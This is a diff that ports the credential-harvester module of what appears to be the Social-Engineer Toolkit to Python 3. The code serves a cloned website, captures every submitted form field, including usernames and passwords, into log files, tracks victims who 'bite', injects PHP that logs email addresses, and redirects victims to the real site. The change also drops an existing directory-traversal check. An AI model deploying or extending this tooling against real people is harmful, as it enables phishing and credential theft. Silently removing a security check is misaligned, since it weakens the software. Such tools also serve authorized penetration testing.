@@ -1,9 +1,16 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 import subprocess
 import sys
 import os
 import re
 import cgi
+import posixpath
+import mimetypes
+import urllib.parse
+import shutil
+import html
+
+# I am Swam Htet Aung I repair some error in this code for python latest versions
 
 # need for python2 -> 3
 try:
@@ -21,6 +28,7 @@ try:
 
 except ImportError:
     from socketserver import *
+    import socketserver
 
 import threading
 import datetime
@@ -54,7 +62,7 @@ sys.path.append(definepath)
 
 
 if not os.path.isfile("%s/src/logs/harvester.log" % (os.getcwd())):
-    filewrite = file("%s/src/logs/harvester.log" % (os.getcwd()), "w")
+    filewrite = open("%s/src/logs/harvester.log" % (os.getcwd()), "w")
     filewrite.write("")
     filewrite.close()
 
@@ -84,10 +92,9 @@ for line in fileopen:
 # if attack vector isnt the multiattack
 if attack_vector != "multiattack":
     print(bcolors.RED + """
-The best way to use this attack is if username and password form
-fields are available. Regardless, this captures all POSTs on a website.""" + bcolors.ENDC)
-# see if we're tabnabbing or multiattack
+The best way to use this attack is if username and password form fields are available. Regardless, this captures all POSTs on a website.""" + bcolors.ENDC)
 
+# see if we're tabnabbing or multiattack
 homepath = os.getcwd()
 
 # pull scraper
@@ -197,39 +204,102 @@ for line in fileopen:
                                          stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
 
 # url decode for postbacks
-
-
 def htc(m):
     return chr(int(m.group(1), 16))
 
 # url decode
-
-
 def urldecode(url):
+    url = url.decode('utf-8')
     rex = re.compile('%([0-9a-hA-H][0-9a-hA-H])', re.M)
     return rex.sub(htc, url)
-
 
 # here is where we specify how many people actually visited versus fell for it
 visits = open(userconfigpath + "visits.file", "a")
 bites = open(userconfigpath + "bites.file", "a")
 
 # SET Handler for handling POST requests and general setup through SSL
-
-
 class SETHandler(BaseHTTPRequestHandler):
+
+    extensions_map = _encodings_map_default = {
+        '.gz': 'application/gzip',
+        '.Z': 'application/octet-stream',
+        '.bz2': 'application/x-bzip2',
+        '.xz': 'application/x-xz',
+    }
 
     def setup(self):
         # added a try except block in case of transmission errors
         try:
 
             self.connection = self.request
-            self.rfile = socket._fileobject(self.request, "rb", self.rbufsize)
-            self.wfile = socket._fileobject(self.request, "wb", self.wbufsize)
+            self.rfile = socket.SocketIO(self.request, "rb")
+            self.wfile = socket.SocketIO(self.request, "wb")
 
         # except errors and pass them
         except:
             pass
+
+    def translate_path(self, path, webroot):
+        """Translate a /-separated PATH to the local filename syntax.
+        Components that mean special things to the local file system
+        (e.g. drive or directory names) are ignored.  (XXX They should
+        probably be diagnosed.)
+        """
+        # abandon query parameters
+        path = path.split('?',1)[0]
+        path = path.split('#',1)[0]
+        # Don't forget explicit trailing slash when normalizing. Issue17324
+        trailing_slash = path.rstrip().endswith('/')
+        try:
+            path = urllib.parse.unquote(path, errors='surrogatepass')
+        except UnicodeDecodeError:
+            path = urllib.parse.unquote(path)
+        path = posixpath.normpath(path)
+        words = path.split('/')
+        words = filter(None, words)
+        path = webroot
+        for word in words:
+            if os.path.dirname(word) or word in (os.curdir, os.pardir):
+                # Ignore components that are not a simple file/directory name
+                continue
+            path = os.path.join(path, word)
+        if trailing_slash:
+            path += '/'
+        return path
+
+    def guess_type(self, path):
+        """Guess the type of a file.
+        Argument is a PATH (a filename).
+        Return value is a string of the form type/subtype,
+        usable for a MIME Content-type header.
+        The default implementation looks the file's extension
+        up in the table self.extensions_map, using application/octet-stream
+        as a default; however it would be permissible (if
+        slow) to look inside the data to make a better guess.
+        """
+        base, ext = posixpath.splitext(path)
+        if ext in self.extensions_map:
+            return self.extensions_map[ext]
+        ext = ext.lower()
+        if ext in self.extensions_map:
+            return self.extensions_map[ext]
+        guess, _ = mimetypes.guess_type(path)
+        if guess:
+            return guess
+        return 'application/octet-stream'
+
+    def copyfile(self, source, outputfile):
+        """Copy all data between two file objects.
+        The SOURCE argument is a file object open for reading
+        (or anything with a read() method) and the DESTINATION
+        argument is a file object open for writing (or
+        anything with a write() method).
+        The only reason for overriding this would be to change
+        the block size or perhaps to replace newlines by CRLF
+        -- note however that this the default server uses this
+        to copy binary data as well.
+        """
+        shutil.copyfileobj(source, outputfile)
 
     # handle basic GET requests
     def do_GET(self):
@@ -248,16 +318,18 @@ class SETHandler(BaseHTTPRequestHandler):
             pass
 
         webroot = os.path.abspath(os.path.join(userconfigpath, 'web_clone'))
-        requested_file = os.path.abspath(os.path.join(webroot, self.path))
+        requested_file = os.path.abspath(os.path.join(webroot, os.path.relpath(self.path, '/')))
+
         # try block setup to catch transmission errors
         try:
 
             if self.path == "/":
                 self.send_response(200)
-                self.send_header('Content_type', 'text/html')
+                self.send_header('Content-Type', 'text/html')
                 self.end_headers()
                 fileopen = open(userconfigpath + "web_clone/index.html", "r")
                 for line in fileopen:
+                    line = line.encode('utf-8')
                     self.wfile.write(line)
                 # write out that we had a visit
                 visits.write("hit\n")
@@ -266,27 +338,30 @@ class SETHandler(BaseHTTPRequestHandler):
             # used for index2
             elif self.path == "/index2.html":
                 self.send_response(200)
-                self.send_header('Content_type', 'text/html')
+                self.send_header('Content-Type', 'text/html')
                 self.end_headers()
                 fileopen = open(userconfigpath + "web_clone/index2.html", "r")
                 for line in fileopen:
+                    line = line.encode('utf-8')
                     self.wfile.write(line)
                 # write out that we had a visit
                 visits.write("hit\n")
                 # visits.close()
 
             else:
-                if not requested_file.startswith(webroot + os.path.sep):
-                    print('directory traversal attempt detected from: ' + self.client_address[0])
-                    self.send_response(404)
+                if os.path.isfile(requested_file):
+
+                    path = self.translate_path(self.path, webroot)
+                    ctype = self.guess_type(path)
+
+                    fileopen = open(requested_file, "rb")
+                    fs = os.fstat(fileopen.fileno())
+                    self.send_response(200)
+                    self.send_header("Content-Type", ctype)
+                    self.send_header("Content-Length", str(fs[6]))
                     self.end_headers()
 
-                elif os.path.isfile(requested_file):
-                    self.send_response(200)
-                    self.end_headers()
-                    fileopen = open(requested_file, "rb")
-                    for line in fileopen:
-                        self.wfile.write(line)
+                    self.copyfile(fileopen, self.wfile)
 
                 else:
                     self.send_response(404)
@@ -301,7 +376,8 @@ class SETHandler(BaseHTTPRequestHandler):
 
     # handle POST requests
     def do_POST(self):
-        length = int(self.headers.getheader('content-length'))
+        length = int(self.headers.get('content-length'))
+        #length = length.decode('utf-8')
         qs = self.rfile.read(length)
         url = urldecode(qs)
         # specify we had a bite
@@ -339,7 +415,7 @@ class SETHandler(BaseHTTPRequestHandler):
                 else:
                     line = ""
                 counter = 1
-            filewrite.write(cgi.escape("PARAM: " + line + "\n"))
+            filewrite.write(html.escape("PARAM: " + line + "\n"))
             filewrite2.write(line + "\n")
             # if a counter hits at 0 then print this line
             if counter == 0:
@@ -376,43 +452,28 @@ class SETHandler(BaseHTTPRequestHandler):
             counter = 1
 
         # when done posting send them back to the original site
-        self.wfile.write('<html><head><meta HTTP-EQUIV="REFRESH" content="0; url=%s"></head></html>' % (RAW_URL))
+        self.send_response(302, 'Found')
+        self.send_header('Location', RAW_URL)
+        self.end_headers()
+        htmll = ('<!doctype html><html><head><meta http-equiv="refresh" content="0; url=%s"><title>Loading...</title></head><body></body></html>' % (RAW_URL)).encode('utf-8')
+        self.wfile.write(htmll)
 
         # set it back to our homepage
         os.chdir(userconfigpath + "web_clone/")
 
-
 class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
     """Handle requests in a separate thread."""
 
-
 def run():
-
     # check if we are not running apache mode
     if apache_check == False:
         try:
-
             server = ThreadedHTTPServer(('', int(web_port)), SETHandler)
             server.serve_forever()
-
         # handle keyboard interrupts
         except KeyboardInterrupt:
-            os.chdir(homepath)
-            try:
-                visits.close()
-                bites.close()
-
-            except:
-                pass
-            if attack_vector != 'multiattack':
-                try:
-                    module_reload(src.webattack.harvester.report_generator)
-                except:
-                    import src.webattack.harvester.report_generator
-            if attack_vector != 'multiattack':
-                return_continue()
-            os.chdir(homepath)
-            httpd.socket.close()
+            server.socket.close()
+            generate_reports()
 
         # handle the rest
         except Exception as e:
@@ -434,42 +495,26 @@ def run():
             if apache_counter == 1:
 
                 # check if we are running apache mode
-                print_status(
-                    "Successfully stopped Apache. Starting the credential harvester.")
-                print_status(
-                    "Harvester is ready, have victim browse to your site.")
+                print_status("Successfully stopped Apache. Starting the credential harvester.")
+                print_status("Harvester is ready, have victim browse to your site.")
                 if apache_check == False:
                     try:
-
                         try:
                             server = ThreadedHTTPServer(
                                 ('', int(web_port)), SETHandler)
                             server.serve_forever()
-
                         # handle keyboard interrupts
                         except KeyboardInterrupt:
-                            os.chdir(homepath)
-                        try:
-                            visits.close()
-                            bites.close()
-
-                        except:
-                            pass
-                        if attack_vector != 'multiattack':
-                            sys.path.append("src/harvester")
-                            from . import report_generator
-                        if attack_vector != 'multiattack':
-                            return_continue()
-                        os.chdir(homepath)
-                        httpd.socket.close()
+                            generate_reports()
+                        server.socket.close()
                     except Exception:
                         apache_counter = 0
 
-            if apache_counter == 0:
-                print(bcolors.GREEN + "[*] Try disabling Apache and try SET again." + bcolors.ENDC)
-                print("[*] Printing error: " + str(e) + "\n")
-                return_continue()
-                exit_set()
+            #if apache_counter == 0:
+            #    print(bcolors.GREEN + "[*] Try disabling Apache and try SET again." + bcolors.ENDC)
+            #    print("[*] Printing error: " + str(e) + "\n")
+            #    return_continue()
+            #    exit_set()
 
     # if we are using apache, then use the harvester php type that writes it out to post.php
     # note just change the index.html to post somewhere else and rename the
@@ -485,14 +530,11 @@ def run():
 
         except Exception as e:
             if os.path.isfile("/etc/init.d/apache2"):
-                apache_start = input(
-                    "[!] Apache may be not running, do you want SET to start the process? [y/n]: ")
+                apache_start = input("[!] Apache may be not running, do you want SET to start the process? [y/n]: ")
                 if apache_start == "y":
-                    subprocess.Popen(
-                        "/etc/init.d/apache2 start", shell=True).wait()
+                    subprocess.Popen("/etc/init.d/apache2 start", shell=True).wait()
 
         try:
-
             apache_dir = check_config("APACHE_DIRECTORY=")
             if os.path.isdir(apache_dir + "/html"):
                 apache_dir = apache_dir + "/html"
@@ -533,14 +575,12 @@ def run():
         if track_email == True:
             fileopen = open(userconfigpath + "web_clone/index.html", "r")
             data = fileopen.read()
-            data = data.replace(
-                "<body>", """<body><?php $file = '%s'; $queryString = ''; foreach ($_GET as $key => $value) { $queryString .= $key . '=' . $value . '&';}$query_string = base64_decode($queryString);file_put_contents($file, print_r("Email address recorded: " . $query_string . "\\n", true), FILE_APPEND);?>""" % (harvester_file))
+            data = data.replace("<body>", """<body><?php $file = '%s'; $queryString = ''; foreach ($_GET as $key => $value) { $queryString .= $key . '=' . $value . '&';}$query_string = base64_decode($queryString);file_put_contents($file, print_r("Email address recorded: " . $query_string . "\\n", true), FILE_APPEND);?>""" % (harvester_file))
             filewrite = open(userconfigpath + "web_clone/index.2", "w")
             filewrite.write(data)
             filewrite.close()
             os.remove(userconfigpath + "web_clone/index.html")
-            shutil.copyfile(userconfigpath + "web_clone/index.2",
-                            userconfigpath + "web_clone/index.html")
+            shutil.copyfile(userconfigpath + "web_clone/index.2", userconfigpath + "web_clone/index.html")
             # copy the entire web_clone directory.
             # Without this only index.php|html are copied even though the user
             # may have chosen to import the entire directory in the set module.
@@ -565,7 +605,10 @@ def run():
 class SecureHTTPServer(HTTPServer):
 
     def __init__(self, server_address, HandlerClass):
-        SocketServer.BaseServer.__init__(self, server_address, HandlerClass)
+        try:
+            SocketServer.BaseServer.__init__(self, server_address, HandlerClass)
+        except NameError:
+            socketserver.BaseServer.__init__(self, server_address, HandlerClass)
         # SSLv2 and SSLv3 supported
         ctx = SSL.Context(SSL.SSLv23_METHOD)
         # pem files defined before
@@ -583,20 +626,39 @@ class SecureHTTPServer(HTTPServer):
         self.server_activate()
 
     def shutdown_request(self, request): 
-        request.shutdown()
+        try:
+            pass
+        except Exception as e:
+            request.shutdown()
 
 
 def ssl_server(HandlerClass=SETHandler, ServerClass=SecureHTTPServer):
-
     try:
         # bind to all interfaces on 443
         server_address = ('', 443)  # (address, port)
         # setup the httpd server
-        httpd = ServerClass(server_address, HandlerClass)
+        server = ServerClass(server_address, HandlerClass)
         # serve the httpd server until exit
-        httpd.serve_forever()
-    except Exception, e: 
+        server.serve_forever()
+    except Exception as e: 
         print_error("Something went wrong.. Printing error: " + str(e))
+    except KeyboardInterrupt:
+        generate_reports()
+
+def generate_reports():
+    os.chdir(homepath)
+    try:
+        visits.close()
+        bites.close()
+    except:
+        pass
+    if attack_vector != 'multiattack':
+        try:
+            module_reload(src.webattack.harvester.report_generator)
+        except:
+            import src.webattack.harvester.report_generator
+    if attack_vector != 'multiattack':
+        return_continue()
 
 if track_email == True:
     webattack_email = True
@@ -613,8 +675,9 @@ for line in fileopen:
     line = line.rstrip()
     if line == 'tabnabbing': 
         print(bcolors.RED + "\n[*] Tabnabbing Attack Vector is Enabled...Victim needs to switch tabs.")
-    print_status("You may need to copy /var/www/* into /var/www/html depending on where your directory structure is.")
-    raw_input("Press {return} if you understand what we're saying here.")
+    if apache_check == True:
+        print_status("You may need to copy /var/www/* into /var/www/html depending on where your directory structure is.")
+        input("Press {return} if you understand what we're saying here.")
     if line == 'webjacking': print(bcolors.RED + "\n[*] Web Jacking Attack Vector is Enabled...Victim needs to click the link.")
 
 if ssl_flag == 'true':
@@ -629,7 +692,7 @@ if ssl_flag == 'true':
     # copy patched socket over to web clone
     definepath = os.getcwd()
     # we need to move a modified version of socket to handle SSL
-    shutil.copyfile("%s/src/core/patched/socket.py" % (definepath), "%s/socket.py" % (definepath))
+    #shutil.copyfile("%s/src/core/patched/socket.py" % (definepath), "%s/socket.py" % (definepath))
 
 # head over to cloned dir
 if apache_check == False:
@@ -657,9 +720,9 @@ try:
         run()
 except:
     # cleanup modified socket
-    if ssl_flag == "true":
-        if os.path.isfile(definepath + "/socket.py"):
-            os.remove(definepath + "/socket.py")
-        if os.path.isfile(definepath + "/socket.pyc"):
-            os.remove(definepath + "/socket.pyc")
+    #if ssl_flag == "true":
+        #if os.path.isfile(definepath + "/socket.py"):
+        #    os.remove(definepath + "/socket.py")
+        #if os.path.isfile(definepath + "/socket.pyc"):
+        #    os.remove(definepath + "/socket.pyc")
     pass
